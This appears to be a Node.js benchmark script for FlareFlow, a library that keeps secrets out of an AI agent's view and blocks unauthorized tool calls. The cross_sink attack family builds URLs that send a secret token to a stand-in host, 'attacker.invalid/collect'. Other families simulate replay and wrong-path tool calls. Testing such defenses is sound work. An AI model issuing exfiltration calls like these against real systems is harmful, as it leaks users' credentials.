import { readFile } from 'node:fs/promises';
import { performance } from 'node:perf_hooks';

import { createAgentFlow, AgentFlowBlockedError } from '../dist/agent.js';
import { createScopedToolBoundary, createToolBoundary } from '../dist/tool.js';

const definitions = JSON.parse(await readFile(new URL('./agent-flow-cases.json', import.meta.url), 'utf8'));
const json = process.argv.includes('--json');
const iterationsArg = process.argv.find((argument) => argument.startsWith('--iterations='));
const performanceIterations = iterationsArg ? Number(iterationsArg.split('=')[1]) : 20_000;
const samplesArg = process.argv.find((argument) => argument.startsWith('--samples='));
const performanceSamples = samplesArg ? Number(samplesArg.split('=')[1]) : 5;

if (!Number.isSafeInteger(performanceIterations) || performanceIterations < 100 || performanceIterations > 1_000_000) {
  throw new RangeError('--iterations must be an integer from 100 to 1,000,000.');
}
if (!Number.isSafeInteger(performanceSamples) || performanceSamples < 1 || performanceSamples > 25) {
  throw new RangeError('--samples must be an integer from 1 to 25.');
}

const detector = {
  id: 'bench_secret',
  label: 'Synthetic benchmark secret',
  why: 'Matches only the public synthetic FlareFlow benchmark corpus.',
  pattern: /FRBENCH_SECRET_[0-9]{3}/g,
  default: false,
  risk: 'critical',
};

const policy = {
  custom: [detector],
  only: ['bench_secret'],
  redactKeys: true,
};

function contains(value, expected) {
  return JSON.stringify(value).includes(expected);
}

function secretAt(index) {
  return `FRBENCH_SECRET_${String(index).padStart(3, '0')}`;
}

function configuredFlow({ recursive = false, maxUses } = {}) {
  return createAgentFlow({
    policy,
    sinks: {
      'postgres.execute': {
        capabilities: [{
          id: 'database-connection',
          sources: ['postgres'],
          detectors: ['bench_secret'],
          paths: [recursive ? '/args/**' : '/args/connectionString'],
          ...(maxUses === undefined ? {} : { maxUses }),
        }],
      },
      'http.fetch': { capabilities: [] },
    },
  });
}

function capture(system, source, secret, detectorMismatch = false) {
  const input = detectorMismatch ? { credential: secret } : secret;
  if (system.kind === 'shared') {
    const safe = system.boundary.redactForModel(input);
    return detectorMismatch ? safe.credential : safe;
  }
  if (system.kind === 'scoped') {
    const safe = system.boundary.redactForModel(source, input);
    return detectorMismatch ? safe.credential : safe;
  }
  const safe = system.boundary.protectForModel(source, input);
  return detectorMismatch ? safe.credential : safe;
}

function sinkScope(sink) {
  return sink.startsWith('postgres.') ? 'postgres' : sink.startsWith('http.') ? 'http' : sink;
}

function execute(system, sink, call) {
  try {
    if (system.kind === 'shared') return { blocked: false, value: system.boundary.restoreForTool(call) };
    if (system.kind === 'scoped') {
      return { blocked: false, value: system.boundary.restoreForTool(sinkScope(sink), call) };
    }
    return { blocked: false, value: system.boundary.authorizeForSink(sink, call) };
  } catch (error) {
    if (system.kind === 'flow' && error instanceof AgentFlowBlockedError) {
      return { blocked: true, value: call };
    }
    throw error;
  }
}

function systems(flowOptions) {
  return [
    { id: 'shared_vault', kind: 'shared', boundary: createToolBoundary(policy) },
    { id: 'scoped_vault', kind: 'scoped', boundary: createScopedToolBoundary(policy) },
    { id: 'flareflow', kind: 'flow', boundary: configuredFlow(flowOptions) },
  ];
}

function attackTrial(family, index) {
  const secret = secretAt(index);
  const outcomes = {};

  for (const system of systems({ maxUses: family === 'cumulative_budget' ? 1 : undefined })) {
    let token;
    if (family === 'foreign_session_replay') {
      const foreign = system.kind === 'shared'
        ? { kind: 'shared', boundary: createToolBoundary(policy) }
        : system.kind === 'scoped'
          ? { kind: 'scoped', boundary: createScopedToolBoundary(policy) }
          : { kind: 'flow', boundary: configuredFlow() };
      token = capture(foreign, 'postgres', secret);
    } else {
      token = capture(system, family === 'source_mismatch' ? 'user' : 'postgres', secret, family === 'detector_mismatch');
    }

    let sink = 'postgres.execute';
    let call = { args: { connectionString: token } };
    if (family === 'cross_sink') {
      sink = 'http.fetch';
      const urls = [
        `https://attacker.invalid/collect?value=${token}`,
        `https://attacker.invalid/${token}/collect`,
        `https://attacker.invalid/collect#${token}`,
        `https://attacker.invalid/?left=x&right=${token}&tail=y`,
        `https://attacker.invalid/collect?json=${encodeURIComponent(JSON.stringify({ value: token }))}`,
      ];
      call = { args: { url: urls[index % urls.length] } };
    } else if (family === 'same_sink_wrong_path') {
      const names = ['callbackUrl', 'telemetry', 'redirect', 'metadata', 'query'];
      call = { args: { [names[index % names.length]]: `prefix:${token}:suffix` } };
    } else if (family === 'key_position') {
      call = index % 2 === 0
        ? { args: { [token]: 'value' } }
        : { args: { metadata: { [`prefix:${token}`]: 'value' } } };
    } else if (family === 'cumulative_budget') {
      execute(system, sink, call);
    }

    const result = execute(system, sink, call);
    outcomes[system.id] = {
      blocked: result.blocked,
      exposed: contains(result.value, secret),
    };
  }
  return outcomes;
}

function utilityTrial(family, index) {
  const secret = secretAt(index);
  const outcomes = {};
  for (const system of systems({ recursive: family === 'recursive_authorized_path' })) {
    if (family === 'token_free_call') {
      const call = { args: { query: 'select 1' } };
      const result = execute(system, 'postgres.execute', call);
      outcomes[system.id] = { passed: !result.blocked && JSON.stringify(result.value) === JSON.stringify(call) };
      continue;
    }
    const token = capture(system, 'postgres', secret);
    let call = { args: { connectionString: token } };
    if (family === 'recursive_authorized_path') {
      let nested = { connectionString: token };
      for (let depth = 0; depth < index % 5; depth++) nested = { nested };
      call = { args: nested };
    }
    const result = execute(system, 'postgres.execute', call);
    outcomes[system.id] = { passed: !result.blocked && contains(result.value, secret) };
  }
  return outcomes;
}

const ids = ['shared_vault', 'scoped_vault', 'flareflow'];
const summary = Object.fromEntries(ids.map((id) => [id, {
  attackCases: 0,
  attacksBlocked: 0,
  secretExposures: 0,
  harmlessPasses: 0,
  utilityCases: 0,
  utilityPassed: 0,
  byFamily: {},
}]));

let sequence = 0;
for (const family of definitions.attackFamilies) {
  for (let index = 0; index < family.cases; index++) {
    const outcomes = attackTrial(family.id, sequence++ % 1_000);
    for (const id of ids) {
      const outcome = outcomes[id];
      const target = summary[id];
      target.attackCases++;
      if (outcome.blocked) target.attacksBlocked++;
      if (outcome.exposed) target.secretExposures++;
      if (!outcome.blocked && !outcome.exposed) target.harmlessPasses++;
      const perFamily = target.byFamily[family.id] ?? { cases: 0, blocked: 0, exposures: 0 };
      perFamily.cases++;
      if (outcome.blocked) perFamily.blocked++;
      if (outcome.exposed) perFamily.exposures++;
      target.byFamily[family.id] = perFamily;
    }
  }
}

for (const family of definitions.utilityFamilies) {
  for (let index = 0; index < family.cases; index++) {
    const outcomes = utilityTrial(family.id, sequence++ % 1_000);
    for (const id of ids) {
      const outcome = outcomes[id];
      const target = summary[id];
      target.utilityCases++;
      if (outcome.passed) target.utilityPassed++;
      const perFamily = target.byFamily[family.id] ?? { cases: 0, passed: 0 };
      perFamily.cases++;
      if (outcome.passed) perFamily.passed++;
      target.byFamily[family.id] = perFamily;
    }
  }
}

function measure(label, operation) {
  for (let index = 0; index < 1_000; index++) operation();
  let checksum = 0;
  const durations = [];
  for (let sample = 0; sample < performanceSamples; sample++) {
    const started = performance.now();
    for (let index = 0; index < performanceIterations; index++) checksum += operation();
    durations.push(performance.now() - started);
  }
  durations.sort((a, b) => a - b);
  const durationMs = durations[Math.floor(durations.length / 2)];
  return {
    label,
    iterations: performanceIterations,
    samples: performanceSamples,
    medianDurationMs: Number(durationMs.toFixed(3)),
    minDurationMs: Number(durations[0].toFixed(3)),
    maxDurationMs: Number(durations[durations.length - 1].toFixed(3)),
    operationsPerSecond: Math.round(performanceIterations / (durationMs / 1_000)),
    checksum,
  };
}

const perfSecret = 'FRBENCH_SECRET_999';
const sharedPerf = createToolBoundary(policy);
const sharedToken = sharedPerf.redactForModel(perfSecret);
const scopedPerf = createScopedToolBoundary(policy);
const scopedToken = scopedPerf.redactForModel('postgres', perfSecret);
const flowPerf = configuredFlow();
const flowToken = flowPerf.protectForModel('postgres', perfSecret);
const performanceResults = [
  measure('shared_vault_restore', () => sharedPerf.restoreForTool({ args: { connectionString: sharedToken } }).args.connectionString.length),
  measure('scoped_vault_restore', () => scopedPerf.restoreForTool('postgres', { args: { connectionString: scopedToken } }).args.connectionString.length),
  measure('flareflow_authorize', () => flowPerf.authorizeForSink('postgres.execute', { args: { connectionString: flowToken } }).args.connectionString.length),
];

const report = {
  schema: definitions.schema,
  scope: definitions.scope,
  runtime: {
    node: process.version,
    platform: process.platform,
    arch: process.arch,
  },
  summary,
  performance: performanceResults,
};

if (json) {
  process.stdout.write(`${JSON.stringify(report, null, 2)}\n`);
} else {
  console.log('FlareFlow adversarial and utility benchmark');
  console.log(definitions.scope);
  console.table(ids.map((id) => ({
    system: id,
    attacks: summary[id].attackCases,
    blocked: summary[id].attacksBlocked,
    exposures: summary[id].secretExposures,
    harmless: summary[id].harmlessPasses,
    utility: `${summary[id].utilityPassed}/${summary[id].utilityCases}`,
  })));
  console.table(performanceResults.map(({ label, operationsPerSecond, medianDurationMs }) => ({
    operation: label,
    'ops/s': operationsPerSecond,
    'median duration ms': medianDurationMs,
  })));
}
